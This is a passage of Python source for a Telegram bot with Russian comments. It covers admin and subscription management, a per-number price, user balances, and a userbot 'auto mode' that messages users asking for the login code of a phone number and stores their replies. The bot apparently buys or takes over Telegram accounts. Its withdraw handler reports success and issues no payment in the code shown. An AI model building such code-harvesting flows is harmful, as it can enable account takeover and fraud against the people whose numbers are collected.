    if not await is_owner(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    # Сохраняем контекст возврата
    await state.update_data(return_context="admin_panel")
    
    await state.set_state(AdminStates.waiting_add_admin)
    await callback.message.edit_text(config.MESSAGES.ADD_ADMIN_ENTER_ID, reply_markup=cancel_keyboard())


@router.message(AdminStates.waiting_add_admin)
async def add_admin_handler(message: Message, state: FSMContext):
    if not await is_owner(message.from_user.id):
        return

    try:
        target_id = int(message.text.strip())
        db.add_admin(target_id, added_by=message.from_user.id, is_owner=False)
        await message.answer(config.MESSAGES.ADD_ADMIN_SUCCESS.format(user_id=target_id))
    except ValueError:
        await message.answer(config.MESSAGES.ADD_ADMIN_INVALID_ID)
    except Exception as e:
        logger.error(f"Ошибка при добавлении админа: {e}")
        await message.answer(config.MESSAGES.ADD_ADMIN_ERROR)
    await state.clear()


@router.callback_query(F.data == "remove_admin")
async def remove_admin_start(callback: CallbackQuery, state: FSMContext):
    if not await is_owner(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    # Сохраняем контекст возврата
    await state.update_data(return_context="admin_panel")
    
    await state.set_state(AdminStates.waiting_remove_admin)
    await callback.message.edit_text(config.MESSAGES.REMOVE_ADMIN_ENTER_ID, reply_markup=cancel_keyboard())


@router.message(AdminStates.waiting_remove_admin)
async def remove_admin_handler(message: Message, state: FSMContext):
    if not await is_owner(message.from_user.id):
        return

    try:
        target_id = int(message.text.strip())
        
        # Проверяем, не пытается ли овнер снять самого себя
        if target_id == message.from_user.id:
            await message.answer(config.MESSAGES.REMOVE_ADMIN_SELF)
            await state.clear()
            return
        
        # Проверяем, является ли пользователь овнером
        if db.is_owner_in_db(target_id):
            await message.answer(config.MESSAGES.REMOVE_ADMIN_OWNER)
            await state.clear()
            return
        
        # Проверяем, является ли пользователь админом
        if not db.is_admin_in_db(target_id):
            await message.answer(config.MESSAGES.REMOVE_ADMIN_NOT_ADMIN.format(user_id=target_id))
            await state.clear()
            return
        
        # Снимаем с админки
        db.remove_admin(target_id)
        await message.answer(config.MESSAGES.REMOVE_ADMIN_SUCCESS.format(user_id=target_id))
    except ValueError:
        await message.answer(config.MESSAGES.REMOVE_ADMIN_INVALID_ID)
    except Exception as e:
        logger.error(f"Ошибка при снятии админа: {e}")
        await message.answer(config.MESSAGES.REMOVE_ADMIN_ERROR)
    await state.clear()


@router.callback_query(F.data == "list_admins")
async def list_admins_handler(callback: CallbackQuery):
    if not await is_owner(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    admins = db.get_all_admins()
    if not admins:
        await callback.message.edit_text(config.MESSAGES.LIST_ADMINS_EMPTY, reply_markup=manage_admins_keyboard())
        return

    text = config.MESSAGES.LIST_ADMINS_HEADER
    for admin in admins:
        role = config.MESSAGES.ADMIN_ROLE_OWNER if admin['is_owner'] else config.MESSAGES.ADMIN_ROLE_ADMIN
        username = admin.get('username') or admin.get('first_name') or f"ID: {admin['user_id']}"
        text += config.MESSAGES.ADMIN_LIST_ITEM.format(role=role, username=username, user_id=admin['user_id'])

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="manage_admins")]
    ])
    await callback.message.edit_text(text, reply_markup=keyboard)


# ===================== Назад в главное меню =====================
@router.callback_query(F.data == "back_main")
async def back_to_main(callback: CallbackQuery):
    if not callback.message:
        await callback.answer()
        return
    
    await show_main_menu(callback.message, callback.from_user.id, callback.from_user.username)


@router.callback_query(F.data == "back_to_admin")
async def back_to_admin_handler(callback: CallbackQuery):
    if not await is_admin(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    active = db.is_work_active()
    is_owner_user = await is_owner(callback.from_user.id)
    admin_text = await get_admin_panel_text()
    await callback.message.edit_text(admin_text, reply_markup=admin_panel(active, is_owner_user))


@router.callback_query(F.data == "check_subscription")
async def check_subscription_handler(callback: CallbackQuery, bot: Bot):
    channel_id = db.get_subscription_channel()
    if not channel_id:
        # Если подписка отключена — сразу разблокируем
        await callback.message.edit_text(config.MESSAGES.SUBSCRIPTION_SUCCESS)
        await callback.answer("Подписка не требуется!")
        return

    try:
        # Получаем username канала для красивой кнопки (если есть)
        chat = await bot.get_chat(channel_id)
        channel_username = chat.username  # может быть None для приватных

        member = await bot.get_chat_member(channel_id, callback.from_user.id)
        if member.status in ("member", "administrator", "creator"):
            await callback.message.edit_text(config.MESSAGES.SUBSCRIPTION_SUCCESS)
            await callback.answer("Подписка подтверждена!")
            return
    except Exception as e:
        logger.error(f"Ошибка проверки подписки: {e}")
        channel_username = None

    # Если не подписан — обновляем сообщение с актуальной кнопкой
    await callback.message.edit_text(
        config.MESSAGES.SUBSCRIPTION_REQUIRED,
        reply_markup=subscription_required_keyboard(channel_username)
    )
    await callback.answer("Вы всё ещё не подписаны на канал", show_alert=True)


@router.callback_query(F.data == "manage_subscription")
async def manage_subscription_handler(callback: CallbackQuery):
    if not await is_owner(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    current_channel = db.get_subscription_channel()
    text = "📢 Управление обязательной подпиской\n\n"
    if current_channel:
        try:
            chat = await callback.bot.get_chat(current_channel)
            text += f"Текущий канал: @{chat.username or 'приватный (ID: ' + str(current_channel) + ')'}"
        except:
            text += f"Текущий канал: ID {current_channel}"
    else:
        text += "Подписка отключена"

    await callback.message.edit_text(text, reply_markup=manage_subscription_keyboard())


@router.callback_query(F.data == "set_subscription_channel")
async def set_subscription_start(callback: CallbackQuery, state: FSMContext):
    if not await is_owner(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    await state.set_state(AdminStates.waiting_subscription_channel)
    await callback.message.edit_text(
        "Введите username канала (с @ или без, например @mychannel или mychannel):",
        reply_markup=cancel_keyboard()
    )


@router.message(AdminStates.waiting_subscription_channel)
async def set_subscription_handler(message: Message, state: FSMContext, bot: Bot):
    if not await is_owner(message.from_user.id):
        return

    channel_username = message.text.strip().lstrip('@')

    if not channel_username:
        await message.answer("❌ Username не может быть пустым.")
        return

    try:
        chat = await bot.get_chat(f"@{channel_username}")
        channel_id = chat.id

        # Проверка, что бот — админ в канале
        bot_member = await bot.get_chat_member(channel_id, (await bot.get_me()).id)
        if bot_member.status not in ("administrator", "creator"):
            await message.answer(config.MESSAGES.SUBSCRIPTION_ADMIN_NOT)
            await state.clear()
            return

        db.set_subscription_channel(channel_id)
        await message.answer(config.MESSAGES.SUBSCRIPTION_SET.format(username=channel_username))
    except Exception as e:
        logger.error(f"Ошибка установки канала: {e}")
        await message.answer("❌ Неверный username или ошибка доступа.")

    await state.clear()


@router.callback_query(F.data == "remove_subscription_channel")
async def remove_subscription_handler(callback: CallbackQuery):
    if not await is_owner(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    db.remove_subscription_channel()
    await callback.message.edit_text(config.MESSAGES.SUBSCRIPTION_REMOVED, reply_markup=admin_panel(db.is_work_active(), True))
    await callback.answer("Подписка отключена")


# ===================== Управление ценой и балансом =====================
@router.callback_query(F.data == "set_price")
async def set_price_start(callback: CallbackQuery, state: FSMContext):
    if not await is_owner(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    # Сохраняем контекст возврата
    await state.update_data(return_context="admin_panel")
    
    await state.set_state(AdminStates.waiting_price)
    await callback.message.edit_text(
        config.MESSAGES.SET_PRICE_ENTER,
        reply_markup=cancel_keyboard()
    )


@router.message(AdminStates.waiting_price)
async def set_price_handler(message: Message, state: FSMContext):
    if not await is_owner(message.from_user.id):
        return

    try:
        price = float(message.text.strip().replace(',', '.'))
        if price <= 0:
            await message.answer(config.MESSAGES.SET_PRICE_INVALID)
            return
        
        db.set_price_per_number(price)
        await message.answer(config.MESSAGES.SET_PRICE_SUCCESS.format(price=f"{price:.2f}"))
    except ValueError:
        await message.answer(config.MESSAGES.SET_PRICE_INVALID)
    except Exception as e:
        logger.error(f"Ошибка установки цены: {e}")
        await message.answer(config.MESSAGES.SET_PRICE_INVALID)
    
    await state.clear()
    
    # Возвращаемся в админ панель
    active = db.is_work_active()
    admin_text = await get_admin_panel_text()
    await message.answer(admin_text, reply_markup=admin_panel(active, True))


@router.callback_query(F.data == "withdraw")
async def withdraw_start(callback: CallbackQuery):
    """Обработчик вывода средств"""
    user_id = callback.from_user.id

    balance = db.get_user_balance(user_id)
    if balance <= 0:
        await callback.answer(config.MESSAGES.WITHDRAW_NO_BALANCE, show_alert=True)
        return

    try:
        await callback.message.edit_text(
            config.MESSAGES.WITHDRAW_SUCCESS
        )
        await callback.answer()
    except Exception as e:
        logger.error(f"Ошибка создания чека на вывод: {e}")
        await callback.answer("❌ Ошибка создания чека", show_alert=True)


# ===================== Автоматический режим =====================
@router.message(Command("startaw"))
async def start_auto_mode_handler(message: Message, bot: Bot):
    """Включение автоматического режима"""
    if not await is_admin(message.from_user.id):
        await message.answer(config.NO_ACCESS_MESSAGE)
        return

    if not db.is_work_active():
        await message.answer("❌ Сначала включите работу через админ-панель!")
        return

    if db.is_auto_mode_enabled():
        await message.answer("⚠️ Автоматический режим уже включен!")
        return

    # Включаем авторежим
    db.set_auto_mode(True)
    
    # Запускаем юзербот (будет импортирован из userbot.py)
    try:
        from userbot import start_userbot
        # Запускаем юзербот в фоне
        asyncio.create_task(start_userbot())
        await message.answer("✅ Автоматический режим включен! Юзербот запускается...")
    except Exception as e:
        logger.error(f"Ошибка запуска юзербота: {e}")
        db.set_auto_mode(False)
        await message.answer(f"❌ Ошибка запуска юзербота: {e}")
        return


@router.message(Command("stopaw"))
async def stop_auto_mode_handler(message: Message, bot: Bot):
    """Выключение автоматического режима"""
    if not await is_admin(message.from_user.id):
        await message.answer(config.NO_ACCESS_MESSAGE)
        return

    if not db.is_auto_mode_enabled():
        await message.answer("⚠️ Автоматический режим не включен!")
        return

    # Выключаем авторежим
    db.set_auto_mode(False)
    
    # Останавливаем юзербот
    try:
        from userbot import stop_userbot
        # Останавливаем юзербот
        asyncio.create_task(stop_userbot())
        await message.answer("✅ Автоматический режим выключен! Юзербот останавливается...")
    except Exception as e:
        logger.error(f"Ошибка остановки юзербота: {e}")
        await message.answer(f"⚠️ Автоматический режим выключен, но была ошибка при остановке юзербота: {e}")


# ===================== Функция для юзербота: запрос кода пользователю =====================
async def request_code_for_userbot(
    phone: str,
    user_id: int,
    number_id: int,
    bot: Bot,
    *,
    is_invalid_code_repeat: bool = False,
) -> Optional[int]:
    """Функция для отправки запроса кода пользователю (вызывается юзерботом)"""
    try:
        # Проверяем типы входных данных
        if not isinstance(phone, str):
            logger.error(f"phone должен быть строкой, получен {type(phone)}: {phone}")
            return None
        
        if not isinstance(user_id, int):
            logger.error(f"user_id должен быть целым числом, получен {type(user_id)}: {user_id}")
            return None
        
        if not isinstance(number_id, int):
            logger.error(f"number_id должен быть целым числом, получен {type(number_id)}: {number_id}")
            return None
        
        # Форматируем номер телефона
        try:
            display_phone = format_phone_display(phone)
            # Убеждаемся, что display_phone - строка
            if not isinstance(display_phone, str):
                logger.warning(f"format_phone_display вернул не строку: {type(display_phone)}, используем phone напрямую")
                display_phone = str(phone)
        except Exception as e:
            logger.error(f"Ошибка форматирования номера {phone}: {e}")
            display_phone = str(phone)
        
        # Формируем текст сообщения пользователю
        message_text = config.MESSAGES.CODE_REQUEST_TO_USER.format(phone=display_phone)
        if is_invalid_code_repeat:
            message_text += (
                "\n\n⚠️ Менеджер отметил код как неверный. "
                "Пожалуйста, отправьте новый код ОТВЕТОМ на это сообщение."
            )

        # Отправляем сообщение пользователю
        request_message = await bot.send_message(
            user_id,
            message_text,
            parse_mode="Markdown",
            reply_markup=request_code_user_keyboard(number_id)
        )
        
        # Проверяем результат bot.send_message
        if not hasattr(request_message, 'message_id'):
            logger.error(f"bot.send_message вернул объект без message_id: {type(request_message)}")
            return None
        
        message_id = request_message.message_id
        
        # Проверяем структуру temp_data
        if not isinstance(temp_data, dict):
            logger.error(f"temp_data должен быть словарем, получен {type(temp_data)}: {temp_data}")
            return None
        
        if 'requests' not in temp_data:
            logger.error(f"temp_data не содержит ключ 'requests'. Содержимое: {temp_data}")
            temp_data['requests'] = {}
        
        if not isinstance(temp_data['requests'], dict):
            logger.error(f"temp_data['requests'] должен быть словарем, получен {type(temp_data['requests'])}")
            temp_data['requests'] = {}
        
        # Удаляем старые записи из temp_data['requests'] для этого номера (от юзербота)
        old_message_ids = []
        for msg_id, req_data in list(temp_data['requests'].items()):
            if req_data.get('number_id') == number_id and req_data.get('admin_id') == 0:
                old_message_ids.append(msg_id)
                temp_data['requests'].pop(msg_id, None)
        
        # Удаляем старые сообщения с запросами кода
        for old_msg_id in old_message_ids:
            try:
                await bot.delete_message(user_id, old_msg_id)
                logger.info(f"Удалено старое сообщение с запросом кода (message_id={old_msg_id})")
            except Exception as e:
                logger.warning(f"Не удалось удалить старое сообщение {old_msg_id}: {e}")
        
        # Сохраняем запрос в temp_data для обработки ответа пользователя
        temp_data['requests'][message_id] = {
            'number_id': number_id,
            'admin_id': 0,  # 0 означает юзербот
            'user_id': user_id,
            'phone': phone,
        }
        
        logger.info(f"Запрос кода успешно отправлен пользователю {user_id} для номера {display_phone}. Message ID: {message_id}")
        return message_id
        
    except KeyError as e:
        logger.error(f"Ошибка KeyError при отправке запроса кода пользователю {user_id}: {e}. Типы: phone={type(phone)}, user_id={type(user_id)}, number_id={type(number_id)}")
        return None
    except AttributeError as e:
        logger.error(f"Ошибка AttributeError при отправке запроса кода пользователю {user_id}: {e}. Типы: phone={type(phone)}, user_id={type(user_id)}, number_id={type(number_id)}")
        return None
    except Exception as e:
        logger.error(f"Ошибка отправки запроса кода пользователю {user_id}: {e}. Типы: phone={type(phone)}, user_id={type(user_id)}, number_id={type(number_id)}")
        import traceback
        logger.error(f"Traceback: {traceback.format_exc()}")
        return None
